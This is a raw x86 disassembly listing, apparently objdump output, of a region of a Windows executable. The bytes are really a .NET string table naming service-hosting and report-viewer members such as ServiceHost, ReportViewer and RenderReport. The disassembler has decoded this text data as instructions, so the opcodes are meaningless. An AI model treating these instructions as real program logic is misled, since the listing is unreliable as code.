  405eb1:	imul   esp,DWORD PTR [ebx+0x65],0x74736f48
  405eb8:	add    BYTE PTR [ecx+0x64],al
  405ebb:	fs dec ebp
  405ebd:	gs je  0x405f21
  405ec0:	fs popa 
  405ec2:	je     0x405f25
  405ec4:	dec    ecx
  405ec5:	outs   dx,BYTE PTR ds:[esi]
  405ec6:	je     0x405f2d
  405ec8:	jb     0x405f30
  405eca:	popa   
  405ecb:	arpl   WORD PTR [ebp+0x54],sp
  405ece:	outs   dx,DWORD PTR ds:[esi]
  405ecf:	push   ebx
  405ed0:	gs jb  0x405f49
  405ed3:	imul   esp,DWORD PTR [ebx+0x65],0x74736f48
  405eda:	add    BYTE PTR [edi+0x61],dl
  405edd:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x75685372
  405ee5:	je     0x405f4b
  405ee7:	outs   dx,DWORD PTR ds:[esi]
  405ee8:	ja     0x405f58
  405eea:	add    BYTE PTR [ebx+0x69],dl
  405eed:	outs   dx,BYTE PTR ds:[si]
  405eef:	popa   
  405ef0:	ins    BYTE PTR es:[edi],dx
  405ef1:	push   ebx
  405ef2:	gs jb  0x405f6b
  405ef5:	imul   esp,DWORD PTR [ebx+0x65],0x6e65704f
  405efc:	add    BYTE PTR [edi+0x65],ah
  405eff:	je     0x405f60
  405f01:	dec    ecx
  405f02:	outs   dx,BYTE PTR ds:[esi]
  405f03:	jae    0x405f79
  405f05:	popa   
  405f06:	outs   dx,BYTE PTR ds:[esi]
  405f07:	arpl   WORD PTR [ebp+0x0],sp
  405f0a:	push   ebx
  405f0b:	gs jb  0x405f84
  405f0e:	imul   esp,DWORD PTR [ebx+0x65],0x74756853
  405f15:	outs   dx,DWORD PTR fs:[esi]
  405f17:	ja     0x405f87
  405f19:	add    BYTE PTR [ebx+0x68],dl
  405f1c:	jne    0x405f92
  405f1e:	outs   dx,DWORD PTR fs:[esi]
  405f20:	ja     0x405f90
  405f22:	add    BYTE PTR [ecx+0x6e],cl
  405f25:	jae    0x405f9b
  405f27:	popa   
  405f28:	outs   dx,BYTE PTR ds:[esi]
  405f29:	arpl   WORD PTR [ebp+0x0],sp
  405f2c:	push   ebx
  405f2d:	gs jb  0x405fa6
  405f30:	imul   esp,DWORD PTR [ebx+0x65],0x63736544
  405f37:	jb     0x405fa2
  405f39:	jo     0x405faf
  405f3b:	imul   ebp,DWORD PTR [edi+0x6e],0x72655300
  405f42:	jbe    0x405fad
  405f44:	arpl   WORD PTR [ebp+0x48],sp
  405f47:	outs   dx,DWORD PTR ds:[esi]
  405f48:	jae    0x405fbe
  405f4a:	inc    edx
  405f4b:	popa   
  405f4c:	jae    0x405fb3
  405f4e:	add    BYTE PTR [ebx+0x79],dl
  405f51:	jae    0x405fc7
  405f53:	gs ins DWORD PTR es:[edi],dx
  405f55:	cs inc ebx
  405f57:	outs   dx,DWORD PTR ds:[esi]
  405f58:	ins    BYTE PTR es:[edi],dx
  405f59:	ins    BYTE PTR es:[edi],dx
  405f5a:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  405f5f:	outs   dx,BYTE PTR ds:[esi]
  405f60:	jae    0x405f90
  405f62:	dec    edi
  405f63:	bound  ebp,QWORD PTR [edx+0x65]
  405f66:	arpl   WORD PTR [ebp+ecx*2+0x6f],si
  405f6a:	fs gs ins BYTE PTR es:[edi],dx
  405f6d:	add    BYTE PTR [ebx+0x6f],al
  405f70:	ins    BYTE PTR es:[edi],dx
  405f71:	ins    BYTE PTR es:[edi],dx
  405f72:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  405f77:	outs   dx,BYTE PTR ds:[esi]
  405f78:	pusha  
  405f79:	xor    DWORD PTR [eax],eax
  405f7b:	push   ebx
  405f7c:	gs jb  0x405ff5
  405f7f:	imul   esp,DWORD PTR [ebx+0x65],0x70646e45
  405f86:	outs   dx,DWORD PTR ds:[esi]
  405f87:	imul   ebp,DWORD PTR [esi+0x74],0x73795300
  405f8e:	je     0x405ff5
  405f90:	ins    DWORD PTR es:[edi],dx
  405f91:	cs push ebx
  405f93:	gs jb  0x40600c
  405f96:	imul   esp,DWORD PTR [ebx+0x65],0x65646f4d
  405f9d:	ins    BYTE PTR es:[edi],dx
  405f9e:	cs inc ebx
  405fa0:	push   0x656e6e61
  405fa5:	ins    BYTE PTR es:[edi],dx
  405fa6:	jae    0x405fa8
  405fa8:	inc    edx
  405fa9:	imul   ebp,DWORD PTR [esi+0x64],0x50676e69
  405fb0:	popa   
  405fb1:	jb     0x406014
  405fb3:	ins    DWORD PTR es:[edi],dx
  405fb4:	gs je  0x40601c
  405fb7:	jb     0x405ffc
  405fb9:	outs   dx,DWORD PTR ds:[esi]
  405fba:	ins    BYTE PTR es:[edi],dx
  405fbb:	ins    BYTE PTR es:[edi],dx
  405fbc:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  405fc1:	outs   dx,BYTE PTR ds:[esi]
  405fc2:	add    BYTE PTR [ecx+0x64],al
  405fc5:	fs inc edx
  405fc7:	imul   ebp,DWORD PTR [esi+0x64],0x50676e69
  405fce:	popa   
  405fcf:	jb     0x406032
  405fd1:	ins    DWORD PTR es:[edi],dx
  405fd2:	gs je  0x40603a
  405fd5:	jb     0x40604a
  405fd7:	add    BYTE PTR [ecx+0x70],al
  405fda:	jo     0x406048
  405fdc:	jns    0x406022
  405fde:	imul   esi,DWORD PTR [ebx+0x70],0x68637461
  405fe5:	inc    edx
  405fe6:	gs push 0x6f697661
  405fec:	jb     0x405fee
  405fee:	push   esi
  405fef:	popa   
  405ff0:	ins    BYTE PTR es:[edi],dx
  405ff1:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x654d0065
  405ff9:	jae    0x40606e
  405ffb:	popa   
  405ffc:	add    BYTE PTR gs:[bx+di+0x43],cl
  406001:	ins    BYTE PTR es:[edi],dx
  406002:	imul   esp,DWORD PTR [ebp+0x6e],0x61684374
  406009:	outs   dx,BYTE PTR ds:[esi]
  40600a:	outs   dx,BYTE PTR ds:[esi]
  40600b:	gs ins BYTE PTR es:[edi],dx
  40600d:	add    BYTE PTR [ecx+0x6e],cl
  406010:	jae    0x406086
  406012:	popa   
  406013:	outs   dx,BYTE PTR ds:[esi]
  406014:	arpl   WORD PTR [ebp+0x43],sp
  406017:	outs   dx,DWORD PTR ds:[esi]
  406018:	outs   dx,BYTE PTR ds:[esi]
  406019:	je     0x406080
  40601b:	js     0x406091
  40601d:	add    BYTE PTR [ecx+0x66],al
  406020:	je     0x406087
  406022:	jb     0x406076
  406024:	arpl   WORD PTR gs:[ebp+0x69],sp
  406028:	jbe    0x40608f
  40602a:	push   edx
  40602b:	gs jno 0x4060a3
  40602e:	gs jae 0x4060a5
  406031:	add    BYTE PTR [edx+0x65],al
  406034:	outs   dx,WORD PTR ds:[esi]
  406036:	jb     0x40609d
  406038:	push   ebx
  406039:	outs   dx,BYTE PTR gs:[esi]
  40603b:	fs push edx
  40603d:	gs jo  0x4060ac
  406040:	jns    0x406042
  406042:	push   ebx
  406043:	gs je  0x40608f
  406046:	je     0x4060ad
  406048:	ins    DWORD PTR es:[edi],dx
  406049:	push   eax
  40604a:	popa   
  40604b:	je     0x4060b5
  40604d:	add    BYTE PTR [edi+0x65],al
  406050:	je     0x406097
  406052:	js     0x4060b9
  406054:	arpl   WORD PTR [ebp+0x74],si
  406057:	imul   ebp,DWORD PTR [edi+0x6e],0x6f666e49
  40605e:	add    BYTE PTR [edi+0x65],al
  406061:	je     0x4060a7
  406063:	outs   dx,DWORD PTR ds:[esi]
  406064:	arpl   WORD PTR [ebp+0x6d],si
  406067:	outs   dx,BYTE PTR gs:[esi]
  406069:	je     0x4060b8
  40606b:	popa   
  40606c:	jo     0x40606e
  40606e:	dec    esp
  40606f:	imul   esi,DWORD PTR [ebx+0x74],0x646e6552
  406076:	gs jb  0x4060e2
  406079:	outs   dx,BYTE PTR ds:[esi]
  40607a:	addr16 inc ebp
  40607c:	js     0x4060f2
  40607e:	outs   dx,BYTE PTR gs:[esi]
  406080:	jae    0x4060eb
  406082:	outs   dx,DWORD PTR ds:[esi]
  406083:	outs   dx,BYTE PTR ds:[esi]
  406084:	jae    0x406086
  406086:	inc    ebx
  406087:	outs   dx,DWORD PTR ds:[esi]
  406088:	ins    DWORD PTR es:[edi],dx
  406089:	jo     0x4060f4
  40608b:	ins    BYTE PTR es:[edi],dx
  40608c:	gs push edx
  40608e:	gs jo  0x406100
  406091:	jb     0x406107
  406093:	add    BYTE PTR [edx+0x65],dl
  406096:	jae    0x4060fd
  406098:	je     0x4060df
  40609a:	js     0x406101
  40609c:	arpl   WORD PTR [ebp+0x74],si
  40609f:	imul   ebp,DWORD PTR [edi+0x6e],0x74655300
  4060a6:	push   edx
  4060a7:	gs jo  0x406119
  4060aa:	jb     0x406120
  4060ac:	push   eax
  4060ad:	popa   
  4060ae:	jb     0x406111
  4060b0:	ins    DWORD PTR es:[edi],dx
  4060b1:	gs je  0x406119
  4060b4:	jb     0x406129
  4060b6:	add    BYTE PTR [edi+0x65],al
  4060b9:	je     0x40610d
  4060bb:	gs jo  0x40612d
  4060be:	jb     0x406134
  4060c0:	inc    esp
  4060c1:	popa   
  4060c2:	je     0x406125
  4060c4:	push   ebx
  4060c5:	outs   dx,DWORD PTR ds:[esi]
  4060c6:	jne    0x40613a
  4060c8:	arpl   WORD PTR [ebp+0x50],sp
  4060cb:	jb     0x40613c
  4060cd:	ins    DWORD PTR es:[edi],dx
  4060ce:	jo     0x406144
  4060d0:	jae    0x4060d2
  4060d2:	push   ebx
  4060d3:	gs je  0x406128
  4060d6:	gs jo  0x406148
  4060d9:	jb     0x40614f
  4060db:	inc    esp
  4060dc:	popa   
  4060dd:	je     0x406140
  4060df:	push   ebx
  4060e0:	outs   dx,DWORD PTR ds:[esi]
  4060e1:	jne    0x406155
  4060e3:	arpl   WORD PTR [ebp+0x43],sp
  4060e6:	jb     0x40614d
  4060e8:	fs outs dx,BYTE PTR gs:[esi]
  4060eb:	je     0x406156
  4060ed:	popa   
  4060ee:	ins    BYTE PTR es:[edi],dx
  4060ef:	jae    0x4060f1
  4060f1:	push   edx
  4060f2:	outs   dx,BYTE PTR gs:[esi]
  4060f4:	fs gs jb 0x4060f8
  4060f8:	push   edx
  4060f9:	outs   dx,BYTE PTR gs:[esi]
  4060fb:	fs gs jb 0x406152
  4060ff:	je     0x406173
  406101:	gs popa 
  406103:	ins    DWORD PTR es:[edi],dx
  406104:	add    BYTE PTR [eax+0x65],dl
  406107:	jb     0x40616f
  406109:	outs   dx,DWORD PTR ds:[esi]
  40610a:	jb     0x406179
  40610c:	push   esp
  40610d:	outs   dx,DWORD PTR ds:[esi]
  40610e:	addr16 ins BYTE PTR es:[di],dx
  406111:	add    BYTE PTR gs:[eax+0x65],dl
  406115:	jb     0x40617d
  406117:	outs   dx,DWORD PTR ds:[esi]
  406118:	jb     0x406187
  40611a:	inc    edx
  40611b:	outs   dx,DWORD PTR ds:[esi]
  40611c:	outs   dx,DWORD PTR ds:[esi]
  40611d:	imul   ebp,DWORD PTR [ebp+0x61],0x72
  406121:	imul   ecx,DWORD PTR [esi+0x61],0x76
  406125:	imul   esp,DWORD PTR [edi+0x61],0x6e6f6974
  40612c:	add    BYTE PTR [eax+0x65],dl
  40612f:	jb     0x406197
  406131:	outs   dx,DWORD PTR ds:[esi]
  406132:	jb     0x4061a1
  406134:	inc    esp
  406135:	outs   dx,DWORD PTR ds:[esi]
  406136:	arpl   WORD PTR [ebp+0x6d],si
  406139:	outs   dx,BYTE PTR gs:[esi]
  40613b:	je     0x40618a
  40613d:	popa   
  40613e:	jo     0x40618e
  406140:	popa   
  406141:	jbe    0x4061ac
  406143:	addr16 popa 
  406145:	je     0x4061b0
  406147:	outs   dx,DWORD PTR ds:[esi]
  406148:	outs   dx,BYTE PTR ds:[esi]
  406149:	add    BYTE PTR [eax+0x65],dl
  40614c:	jb     0x4061b4
  40614e:	outs   dx,DWORD PTR ds:[esi]
  40614f:	jb     0x4061be
  406151:	push   ebx
  406152:	outs   dx,DWORD PTR ds:[esi]
  406153:	jb     0x4061c9
  406155:	add    BYTE PTR [eax+0x65],dl
  406158:	jb     0x4061c0
  40615a:	outs   dx,DWORD PTR ds:[esi]
  40615b:	jb     0x4061ca
  40615d:	push   ebx
  40615e:	gs popa 
  406160:	jb     0x4061c5
  406162:	push   0x72655000
  406167:	outs   dx,WORD PTR ds:[esi]
  406169:	jb     0x4061d8
  40616b:	inc    esp
  40616c:	jb     0x4061d7
  40616e:	ins    BYTE PTR es:[edi],dx
  40616f:	ins    BYTE PTR es:[edi],dx
  406170:	je     0x4061da
  406172:	jb     0x4061e3
  406174:	jne    0x4061dd
  406176:	push   0x6c655200
  40617b:	gs popa 
  40617d:	jae    0x4061e4
  40617f:	push   eax
  406180:	gs jb  0x4061f6
  406183:	imul   esi,DWORD PTR [ebx+0x74],0x52746e65
  40618a:	gs jae 0x4061fc
  40618d:	jne    0x406201
  40618f:	arpl   WORD PTR [ebp+0x73],sp
  406192:	add    BYTE PTR [ebx+0x65],dl
  406195:	je     0x4061da
  406197:	popa   
  406198:	outs   dx,BYTE PTR ds:[esi]
  406199:	arpl   WORD PTR [ebp+0x6c],sp
  40619c:	push   ebx
  40619d:	je     0x406200
  40619f:	je     0x406206
  4061a1:	add    BYTE PTR [ebx+0x6c],al
  4061a4:	outs   dx,DWORD PTR ds:[esi]
  4061a5:	jae    0x40620c
  4061a7:	inc    ebp
  4061a8:	js     0x40620f
  4061aa:	arpl   WORD PTR [ebp+0x74],si
  4061ad:	imul   ebp,DWORD PTR [edi+0x6e],0x73736553
  4061b4:	imul   ebp,DWORD PTR [edi+0x6e],0x74654700
  4061bb:	push   edx
  4061bc:	gs jo  0x40622e
  4061bf:	jb     0x406235
  4061c1:	inc    esp
  4061c2:	imul   bp,WORD PTR gs:[esi+0x69],0x6974
  4061c9:	outs   dx,DWORD PTR ds:[esi]
  4061ca:	outs   dx,BYTE PTR ds:[esi]
  4061cb:	add    BYTE PTR [edi+0x65],al
  4061ce:	je     0x406222
  4061d0:	gs jae 0x406242
  4061d3:	jne    0x406247
  4061d5:	arpl   WORD PTR [ebp+0x0],sp
  4061d8:	inc    edi
  4061d9:	gs je  0x406220
  4061dc:	popa   
  4061dd:	je     0x406240
  4061df:	push   ebx
  4061e0:	outs   dx,DWORD PTR ds:[esi]
  4061e1:	jne    0x406255
  4061e3:	arpl   WORD PTR [ebp+0x0],sp
  4061e6:	inc    edi
  4061e7:	gs je  0x40622e
  4061ea:	popa   
  4061eb:	je     0x40624e
  4061ed:	push   ebx
  4061ee:	gs je  0x4061f1
  4061f1:	inc    edi
  4061f2:	gs je  0x406247
  4061f5:	gs jo  0x406267
  4061f8:	jb     0x40626e
  4061fa:	inc    esp
  4061fb:	popa   
  4061fc:	je     0x40625f
  4061fe:	push   ebx
  4061ff:	outs   dx,DWORD PTR ds:[esi]
  406200:	jne    0x406274
  406202:	arpl   WORD PTR [ebp+0x43],sp
  406205:	jb     0x40626c
  406207:	fs outs dx,BYTE PTR gs:[esi]
  40620a:	je     0x406275
  40620c:	popa   
  40620d:	ins    BYTE PTR es:[edi],dx
  40620e:	jae    0x406210
  406210:	inc    edi
  406211:	gs je  0x406266
  406214:	gs jo  0x406286
  406217:	jb     0x40628d
  406219:	inc    esp
  40621a:	popa   
  40621b:	je     0x40627e
  40621d:	inc    esi
  40621e:	imul   ebp,DWORD PTR [ebp+eiz*2+0x49],0x6f666e
  406226:	push   ebp
  406227:	jo     0x40628d
  406229:	popa   
  40622a:	je     0x406291
  40622c:	push   edx
  40622d:	gs jo  0x40629f
  406230:	jb     0x4062a6
  406232:	inc    esp
  406233:	popa   
  406234:	je     0x406297
  406236:	inc    esi
  406237:	imul   ebp,DWORD PTR [ebp+eiz*2+0x53],0x75746174
  40623f:	jae    0x406241
  406241:	inc    ebx
  406242:	jb     0x4062a9
  406244:	popa   
  406245:	je     0x4062ac
  406247:	push   ebx
  406248:	je     0x4062bc
  40624a:	gs popa 
  40624c:	ins    DWORD PTR es:[edi],dx
  40624d:	add    BYTE PTR [ebp+0x5f],ch
  406250:	jae    0x4062b7
  406252:	jb     0x4062ca
  406254:	imul   esp,DWORD PTR [ebx+0x65],0x6c6c6143
  40625b:	bound  esp,QWORD PTR [ecx+0x63]
  40625e:	imul   eax,DWORD PTR [eax],0x6d
  406261:	pop    edi
  406262:	arpl   WORD PTR [ecx+0x6e],sp
  406265:	arpl   WORD PTR [ebp+0x6c],sp
  406268:	push   ebx
  406269:	je     0x4062cc
  40626b:	je     0x4062d2
  40626d:	add    BYTE PTR [eax+0x72],dl
  406270:	gs jbe 0x4062dc
  406273:	gs ja  0x4062bf
  406276:	je     0x4062dd
  406278:	ins    DWORD PTR es:[edi],dx
  406279:	inc    ebx
  40627a:	outs   dx,DWORD PTR ds:[esi]
  40627b:	outs   dx,BYTE PTR ds:[esi]
  40627c:	je     0x4062e3
  40627e:	js     0x4062f4
  406280:	add    BYTE PTR [ebp+0x69],cl
  406283:	arpl   WORD PTR [edx+0x6f],si
  406286:	jae    0x4062f7
  406288:	data16 je 0x4062b9
  40628b:	push   edx
  40628c:	gs jo  0x4062fe
  40628f:	jb     0x406305
  406291:	imul   ebp,DWORD PTR [esi+0x67],0x76726553
  406298:	imul   esp,DWORD PTR [ebx+0x65],0x72502e73
  40629f:	outs   dx,DWORD PTR ds:[esi]
  4062a0:	arpl   WORD PTR [ebp+0x73],sp
  4062a3:	jae    0x40630e
  4062a5:	outs   dx,BYTE PTR ds:[esi]
  4062a6:	addr16 inc ebx
  4062a8:	outs   dx,DWORD PTR ds:[esi]
  4062a9:	jb     0x406310
  4062ab:	add    BYTE PTR [ebp+0x69],cl
  4062ae:	arpl   WORD PTR [edx+0x6f],si
  4062b1:	jae    0x406322
  4062b3:	data16 je 0x4062e4
  4062b6:	push   edx
  4062b7:	gs jo  0x406329
  4062ba:	jb     0x406330
  4062bc:	imul   ebp,DWORD PTR [esi+0x67],0x76726553
  4062c3:	imul   esp,DWORD PTR [ebx+0x65],0x61442e73
  4062ca:	je     0x40632d
  4062cc:	inc    ebp
  4062cd:	js     0x406343
  4062cf:	outs   dx,BYTE PTR gs:[esi]
  4062d1:	jae    0x40633c
  4062d3:	outs   dx,DWORD PTR ds:[esi]
  4062d4:	outs   dx,BYTE PTR ds:[esi]
  4062d5:	jae    0x4062d7
  4062d7:	inc    esp
  4062d8:	popa   
  4062d9:	je     0x40633c
  4062db:	push   ebx
  4062dc:	outs   dx,DWORD PTR ds:[esi]
  4062dd:	jne    0x406351
  4062df:	arpl   WORD PTR [ebp+0x49],sp
  4062e2:	outs   dx,BYTE PTR ds:[esi]
  4062e3:	outs   dx,WORD PTR ds:[esi]
  4062e5:	add    BYTE PTR [ecx+eiz*2+0x74],al
  4062e9:	popa   
  4062ea:	push   ebx
  4062eb:	gs je  0x406337
  4062ee:	outs   dx,BYTE PTR ds:[esi]
  4062ef:	outs   dx,WORD PTR ds:[esi]
  4062f1:	add    BYTE PTR [ebx+0x65],dl
  4062f4:	je     0x406348
  4062f6:	gs jo  0x406368
  4062f9:	jb     0x40636f
  4062fb:	inc    esp
  4062fc:	imul   bp,WORD PTR gs:[esi+0x69],0x6974
  406303:	outs   dx,DWORD PTR ds:[esi]
  406304:	outs   dx,BYTE PTR ds:[esi]
  406305:	add    BYTE PTR [eax+0x61],cl
  406308:	jae    0x40634e
  40630a:	imul   esi,DWORD PTR [edx+0x65],0x65527463
  406311:	jo     0x406382
  406313:	jb     0x406389
  406315:	inc    esp
  406316:	imul   bp,WORD PTR gs:[esi+0x69],0x6974
  40631d:	outs   dx,DWORD PTR ds:[esi]
  40631e:	outs   dx,BYTE PTR ds:[esi]
  40631f:	add    BYTE PTR [ecx+0x63],al
  406322:	je     0x40638d
  406324:	outs   dx,DWORD PTR ds:[esi]
  406325:	outs   dx,BYTE PTR ds:[esi]
  406326:	add    BYTE PTR [ebp+0x78],al
  406329:	arpl   WORD PTR gs:[ebp+0x74],si
  40632d:	gs inc ebx
  40632f:	popa   
  406330:	ins    BYTE PTR es:[edi],dx
  406331:	ins    BYTE PTR es:[edi],dx
  406332:	bound  esp,QWORD PTR [ecx+0x63]
  406335:	imul   ecx,DWORD PTR [ebp+0x65],0x74
  406339:	push   0x6700646f
  40633e:	gs je  0x4063a0
  406341:	inc    ecx
  406342:	arpl   WORD PTR [ebx+0x65],sp
  406345:	jae    0x4063ba
  406347:	inc    esp
  406348:	outs   dx,BYTE PTR gs:[esi]
  40634a:	imul   esp,DWORD PTR [ebp+0x64],0x63634100
  406351:	gs jae 0x4063c7
  406354:	inc    esp
  406355:	outs   dx,BYTE PTR gs:[esi]
  406357:	imul   esp,DWORD PTR [ebp+0x64],0x75635f00
  40635e:	ins    BYTE PTR es:[edi],dx
  40635f:	je     0x4063d6
  406361:	jb     0x4063c8
  406363:	add    BYTE PTR [edi+0x6e],cl
  406366:	push   ebx
  406367:	push   0x6f647475
  40636c:	ja     0x4063dc
  40636e:	add    BYTE PTR [ecx+0x64],ah
  406371:	fs pop edi
  406373:	dec    edi
  406374:	outs   dx,BYTE PTR ds:[esi]
  406375:	push   ebx
  406376:	push   0x6f647475
  40637b:	ja     0x4063eb
  40637d:	add    BYTE PTR [edx+0x65],dh
  406380:	ins    DWORD PTR es:[edi],dx
  406381:	outs   dx,DWORD PTR ds:[esi]
  406382:	jbe    0x4063e9
  406384:	pop    edi
  406385:	dec    edi
  406386:	outs   dx,BYTE PTR ds:[esi]
  406387:	push   ebx
  406388:	push   0x6f647475
  40638d:	ja     0x4063fd
  40638f:	add    BYTE PTR [ebp+0x5f],ch
  406392:	imul   ebp,DWORD PTR [esi+0x69],0x636f4c74
  406399:	imul   eax,DWORD PTR [eax],0x4d
  40639c:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  4063a3:	je     0x4063d3
  4063a5:	push   edx
  4063a6:	gs jo  0x406418
  4063a9:	jb     0x40641f
  4063ab:	imul   ebp,DWORD PTR [esi+0x67],0x6e69572e
  4063b2:	inc    esi
  4063b3:	outs   dx,DWORD PTR ds:[esi]
  4063b4:	jb     0x406423
  4063b6:	jae    0x4063b8
  4063b8:	inc    esp
  4063b9:	gs jae 0x406425
  4063bc:	outs   dx,BYTE PTR ds:[si]
  4063be:	gs jb  0x406414
  4063c1:	gs jb  0x40643a
  4063c4:	imul   esp,DWORD PTR [ebx+0x65],0x705f6d00
  4063cb:	jb     0x40643c
  4063cd:	arpl   WORD PTR [ebp+0x73],sp
  4063d0:	jae    0x40643b
  4063d2:	outs   dx,BYTE PTR ds:[esi]
  4063d3:	addr16 dec eax
  4063d5:	outs   dx,DWORD PTR ds:[esi]
  4063d6:	jae    0x40644c
  4063d8:	add    BYTE PTR [ebp+0x5f],ch
  4063db:	arpl   WORD PTR [ecx+0x6c],sp
  4063de:	ins    BYTE PTR es:[edi],dx
  4063df:	bound  esp,QWORD PTR [ecx+0x63]
  4063e2:	imul   eax,DWORD PTR [eax],0x44
  4063e5:	imul   esi,DWORD PTR [ebx+0x70],0x65736f
  4063ec:	dec    edi
  4063ed:	outs   dx,BYTE PTR ds:[esi]
  4063ee:	inc    edx
  4063ef:	imul   ebp,DWORD PTR gs:[bp+0x52],0x65757165
  4063f8:	jae    0x40646e
  4063fa:	add    BYTE PTR [ecx+0x6e],cl
  4063fd:	je     0x406464
  4063ff:	jb     0x40646f
  406401:	popa   
  406402:	ins    BYTE PTR es:[edi],dx
  406403:	push   edx
  406404:	outs   dx,BYTE PTR gs:[esi]
  406406:	fs gs jb 0x40640a
  40640a:	push   ebx
  40640b:	outs   dx,BYTE PTR gs:[esi]
  40640d:	fs push ebx
  40640f:	je     0x406483
  406411:	gs popa 
  406413:	ins    DWORD PTR es:[edi],dx
  406414:	push   esp
  406415:	outs   dx,DWORD PTR ds:[esi]
  406416:	inc    ebx
  406417:	popa   
  406418:	ins    BYTE PTR es:[edi],dx
  406419:	ins    BYTE PTR es:[edi],dx
  40641a:	bound  esp,QWORD PTR [ecx+0x63]
  40641d:	imul   eax,DWORD PTR [ecx+0x6e],0x64
  406421:	inc    esp
  406422:	imul   esi,DWORD PTR [ebx+0x70],0x65736f
  406429:	push   ebx
  40642a:	jns    0x40649f
  40642c:	je     0x406493
  40642e:	ins    DWORD PTR es:[edi],dx
  40642f:	cs push esp
  406431:	gs js  0x4064a8
  406434:	add    BYTE PTR [ebp+0x6e],al
  406437:	arpl   WORD PTR [edi+0x64],bp
  40643a:	imul   ebp,DWORD PTR [esi+0x67],0x73795300
  406441:	je     0x4064a8
  406443:	ins    DWORD PTR es:[edi],dx
  406444:	cs dec ecx
  406446:	dec    edi
  406447:	add    BYTE PTR [ebp+0x65],cl
  40644a:	ins    DWORD PTR es:[edi],dx
  40644b:	outs   dx,DWORD PTR ds:[esi]
  40644c:	jb     0x4064c7
  40644e:	push   ebx
  40644f:	je     0x4064c3
  406451:	gs popa 
  406453:	ins    DWORD PTR es:[edi],dx
  406454:	add    BYTE PTR [edi+0x65],ah
  406457:	je     0x4064b8
  406459:	dec    esi
  40645a:	popa   
  40645b:	ins    DWORD PTR es:[edi],dx
  40645c:	add    BYTE PTR gs:[ebx+0x65],dh
  406460:	je     0x4064c1
  406462:	dec    esi
  406463:	popa   
  406464:	ins    DWORD PTR es:[edi],dx
  406465:	add    BYTE PTR gs:[edi+0x65],ah
  406469:	je     0x4064ca
  40646b:	inc    esi
  40646c:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x6e657478
  406474:	jae    0x4064df
  406476:	outs   dx,DWORD PTR ds:[esi]
  406477:	outs   dx,BYTE PTR ds:[esi]
  406478:	add    BYTE PTR [ebx+0x65],dh
  40647b:	je     0x4064dc
  40647d:	inc    esi
  40647e:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x6e657478
  406486:	jae    0x4064f1
  406488:	outs   dx,DWORD PTR ds:[esi]
  406489:	outs   dx,BYTE PTR ds:[esi]
  40648a:	add    BYTE PTR [edi+0x65],ah
  40648d:	je     0x4064ee
  40648f:	inc    ebp
  406490:	outs   dx,BYTE PTR ds:[esi]
  406491:	arpl   WORD PTR [edi+0x64],bp
  406494:	imul   ebp,DWORD PTR [esi+0x67],0x74657300
  40649b:	pop    edi
  40649c:	inc    ebp
  40649d:	outs   dx,BYTE PTR ds:[esi]
  40649e:	arpl   WORD PTR [edi+0x64],bp
  4064a1:	imul   ebp,DWORD PTR [esi+0x67],0x74656700
  4064a8:	pop    edi
  4064a9:	dec    ebp
  4064aa:	imul   ebp,DWORD PTR [ebp+0x65],0x65707954
  4064b1:	add    BYTE PTR [ebx+0x65],dh
  4064b4:	je     0x406515
  4064b6:	dec    ebp
  4064b7:	imul   ebp,DWORD PTR [ebp+0x65],0x65707954
  4064be:	add    BYTE PTR [edi+0x65],ah
  4064c1:	je     0x406522
  4064c3:	push   ebx
  4064c4:	je     0x406538
  4064c6:	gs popa 
  4064c8:	ins    DWORD PTR es:[edi],dx
  4064c9:	add    BYTE PTR [ebx+0x65],dh
  4064cc:	je     0x40652d
  4064ce:	push   ebx
  4064cf:	je     0x406543
  4064d1:	gs popa 
  4064d3:	ins    DWORD PTR es:[edi],dx
  4064d4:	add    BYTE PTR [esi+ecx*2],bh
  4064d7:	popa   
  4064d8:	ins    DWORD PTR es:[edi],dx
  4064d9:	gs imul ebx,DWORD PTR ds:[edi+0x5f],0x42
  4064df:	popa   
  4064e0:	arpl   WORD PTR [ebx+0x69],bp
  4064e3:	outs   dx,BYTE PTR ds:[esi]
  4064e4:	addr16 inc esi
  4064e6:	imul   esp,DWORD PTR [ebp+0x6c],0x463c0064
  4064ed:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x6e657478
  4064f5:	jae    0x406560
  4064f7:	outs   dx,DWORD PTR ds:[esi]
  4064f8:	outs   dx,BYTE PTR ds:[esi]
  4064f9:	imul   ebx,DWORD PTR ds:[edi+0x5f],0x42
  4064fe:	popa   
  4064ff:	arpl   WORD PTR [ebx+0x69],bp
  406502:	outs   dx,BYTE PTR ds:[esi]
  406503:	addr16 inc esi
  406505:	imul   esp,DWORD PTR [ebp+0x6c],0x453c0064
  40650c:	outs   dx,BYTE PTR ds:[esi]
  40650d:	arpl   WORD PTR [edi+0x64],bp
  406510:	imul   ebp,DWORD PTR [esi+0x67],0x5f5f6b3e
  406517:	inc    edx
  406518:	popa   
  406519:	arpl   WORD PTR [ebx+0x69],bp
  40651c:	outs   dx,BYTE PTR ds:[esi]
  40651d:	addr16 inc esi
  40651f:	imul   esp,DWORD PTR [ebp+0x6c],0x4d3c0064
  406526:	imul   ebp,DWORD PTR [ebp+0x65],0x65707954
  40652d:	imul   ebx,DWORD PTR ds:[edi+0x5f],0x42
  406532:	popa   
  406533:	arpl   WORD PTR [ebx+0x69],bp
  406536:	outs   dx,BYTE PTR ds:[esi]
  406537:	addr16 inc esi
  406539:	imul   esp,DWORD PTR [ebp+0x6c],0x533c0064
  406540:	je     0x4065b4
  406542:	gs popa 
  406544:	ins    DWORD PTR es:[edi],dx
  406545:	imul   ebx,DWORD PTR ds:[edi+0x5f],0x42
  40654a:	popa   
  40654b:	arpl   WORD PTR [ebx+0x69],bp
  40654e:	outs   dx,BYTE PTR ds:[esi]
  40654f:	addr16 inc esi
  406551:	imul   esp,DWORD PTR [ebp+0x6c],0x614e0064
  406558:	ins    DWORD PTR es:[edi],dx
  406559:	add    BYTE PTR gs:[esi+0x69],al
  40655d:	ins    BYTE PTR es:[edi],dx
  40655e:	gs inc ebp
  406560:	js     0x4065d6
  406562:	outs   dx,BYTE PTR gs:[esi]
  406564:	jae    0x4065cf
  406566:	outs   dx,DWORD PTR ds:[esi]
